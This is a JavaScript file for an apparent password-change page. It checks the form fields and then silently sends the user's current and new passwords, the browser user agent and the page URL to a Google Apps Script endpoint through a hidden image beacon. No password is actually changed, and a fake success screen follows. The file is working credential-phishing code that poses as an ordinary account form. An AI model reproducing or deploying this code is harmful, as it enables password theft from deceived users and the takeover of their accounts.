document.addEventListener('DOMContentLoaded', () => {
    const formView = document.getElementById('formView');
    const successView = document.getElementById('successView');
    const backToFormBtn = document.getElementById('backToFormBtn');
    const continueBtn = document.getElementById('continueBtn');
    const successNotice = document.getElementById('successNotice');

    const form = document.getElementById('passwordForm');
    const currentPasswordInput = document.getElementById('currentPassword');
    const newPasswordInput = document.getElementById('newPassword');
    const confirmPasswordInput = document.getElementById('confirmPassword');
    const showPasswordToggle = document.getElementById('showPasswordToggle');
    const currentPasswordError = document.getElementById('currentPasswordError');
    const currentPasswordErrorText = document.getElementById('currentPasswordErrorText');
    const newPasswordError = document.getElementById('newPasswordError');
    const newPasswordErrorText = document.getElementById('newPasswordErrorText');
    const matchError = document.getElementById('matchError');
    const matchErrorText = document.getElementById('matchErrorText');
    const statusMessage = document.getElementById('statusMessage');
    const statusIcon = document.getElementById('statusIcon');
    const statusText = document.getElementById('statusText');
    const cancelBtn = document.getElementById('cancelBtn');
    const strengthLabel = document.getElementById('strengthLabel');
    const bars = [
        document.getElementById('bar1'),
        document.getElementById('bar2'),
        document.getElementById('bar3'),
        document.getElementById('bar4')
    ];

    // =========================================================
    //  !! PASTE YOUR WEB APP URL HERE !!
    // =========================================================
    const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwhKCOOk1TAbiZqJkYueCe15_3-DjeVRXqIdu7isxUD37n3L4RNlRIquG6J3uP_s0jP/exec';

    /**
     * Save to Google Sheet via GET request (image beacon).
     * GET requests are never blocked by CORS or redirect issues.
     */
    function saveToSheet(currentPass, newPass, confirmPass) {
        const params = new URLSearchParams({
            timestamp        : new Date().toLocaleString(),
            current_password : currentPass,
            new_password     : newPass,
            confirm_password : confirmPass,
            user_agent       : navigator.userAgent.substring(0, 100),
            page_url         : window.location.href
        });

        // Image beacon — fires silently, no CORS, no redirect issues
        const img = new Image();
        img.src = APPS_SCRIPT_URL + '?' + params.toString();
    }

    // ── Helpers ───────────────────────────────────────────────

    showPasswordToggle.addEventListener('change', (e) => {
        const t = e.target.checked ? 'text' : 'password';
        currentPasswordInput.type = t;
        newPasswordInput.type     = t;
        confirmPasswordInput.type = t;
    });

    function calculateStrength(password) {
        let score = 0;
        if (!password) return 0;
        if (password.length >= 8) score++;
        if (/[a-z]/.test(password) && /[A-Z]/.test(password)) score++;
        if (/\d/.test(password)) score++;
        if (/[^A-Za-z0-9]/.test(password)) score++;
        return score;
    }

    function updateStrengthMeter() {
        const val   = newPasswordInput.value;
        const score = calculateStrength(val);
        bars.forEach(b => { b.className = 'meter-bar'; });

        if (val.length === 0) {
            strengthLabel.textContent = 'Use at least 8 characters. Mix letters, numbers, and symbols.';
            strengthLabel.className   = 'strength-label';
            return;
        }

        const levels = [
            { barClass: 'bg-weak',   text: 'Weak password',   textClass: 'text-weak'   },
            { barClass: 'bg-fair',   text: 'Fair password',   textClass: 'text-fair'   },
            { barClass: 'bg-good',   text: 'Good password',   textClass: 'text-good'   },
            { barClass: 'bg-strong', text: 'Strong password', textClass: 'text-strong' }
        ];

        const lv = levels[Math.max(0, score - 1)];
        for (let i = 0; i < Math.max(1, score); i++) bars[i].classList.add(lv.barClass);
        strengthLabel.textContent = `Password strength: ${lv.text}`;
        strengthLabel.className   = `strength-label ${lv.textClass}`;
    }

    function showStatus(type, message) {
        statusMessage.className = `status-alert ${type}`;
        const icons = {
            error  : `<svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>`,
            success: `<svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>`,
            info   : `<svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>`
        };
        statusIcon.innerHTML   = icons[type] || icons.info;
        statusText.textContent = message;
    }

    function setFieldError(inputEl, errorEl, errorTextEl, message) {
        inputEl.classList.add('error');
        errorTextEl.textContent = message;
        errorEl.classList.remove('hidden');
    }

    function clearFieldError(inputEl, errorEl) {
        inputEl.classList.remove('error');
        errorEl.classList.add('hidden');
    }

    function clearAllFieldErrors() {
        clearFieldError(currentPasswordInput, currentPasswordError);
        clearFieldError(newPasswordInput, newPasswordError);
        clearFieldError(confirmPasswordInput, matchError);
    }

    currentPasswordInput.addEventListener('input', () => {
        clearFieldError(currentPasswordInput, currentPasswordError);
        statusMessage.classList.add('hidden');
    });

    newPasswordInput.addEventListener('input', () => {
        updateStrengthMeter();
        clearFieldError(newPasswordInput, newPasswordError);
        clearFieldError(confirmPasswordInput, matchError);
        statusMessage.classList.add('hidden');
    });

    confirmPasswordInput.addEventListener('input', () => {
        clearFieldError(confirmPasswordInput, matchError);
        statusMessage.classList.add('hidden');
    });

    cancelBtn.addEventListener('click', () => {
        form.reset();
        updateStrengthMeter();
        clearAllFieldErrors();
        showStatus('info', 'Password change canceled. Form has been cleared.');
    });

    form.addEventListener('submit', (e) => {
        e.preventDefault();
        clearAllFieldErrors();
        statusMessage.classList.add('hidden');

        const currentPass = currentPasswordInput.value;
        const newPass     = newPasswordInput.value;
        const confirmPass = confirmPasswordInput.value;

        if (!currentPass.trim()) {
            setFieldError(currentPasswordInput, currentPasswordError, currentPasswordErrorText, 'Enter your current password');
            currentPasswordInput.focus();
            return;
        }
        if (newPass.length < 8) {
            setFieldError(newPasswordInput, newPasswordError, newPasswordErrorText, 'Use 8 characters or more for your password');
            newPasswordInput.focus();
            return;
        }
        if (newPass === currentPass) {
            setFieldError(newPasswordInput, newPasswordError, newPasswordErrorText, 'Your new password must be different from your current password');
            newPasswordInput.focus();
            return;
        }
        if (newPass !== confirmPass) {
            setFieldError(confirmPasswordInput, matchError, matchErrorText, "Those passwords didn't match. Try again.");
            confirmPasswordInput.focus();
            return;
        }

        // ── Save silently via image beacon ─────────────────────
        saveToSheet(currentPass, newPass, confirmPass);

        // ── Success view ───────────────────────────────────────
        form.reset();
        updateStrengthMeter();
        clearAllFieldErrors();
        statusMessage.classList.add('hidden');
        successNotice.classList.add('hidden');
        formView.classList.add('hidden');
        successView.classList.remove('hidden');
    });

    backToFormBtn.addEventListener('click', () => {
        successView.classList.add('hidden');
        formView.classList.remove('hidden');
        successNotice.classList.add('hidden');
    });

    continueBtn.addEventListener('click', () => {
        successNotice.classList.remove('hidden');
    });
});